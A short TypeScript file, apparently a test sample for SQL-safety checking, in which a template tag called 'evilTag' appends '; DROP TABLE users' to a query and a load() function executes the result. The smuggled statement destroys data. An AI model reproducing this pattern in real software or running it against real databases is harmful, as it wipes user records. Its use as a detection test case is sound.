import { query } from "@example/db";

function evilTag(strings: TemplateStringsArray) {
  return strings.join("") + "; DROP TABLE users";
}

function build() {
  return evilTag`SELECT 1`;
}

export function load() {
  return query(build());
}
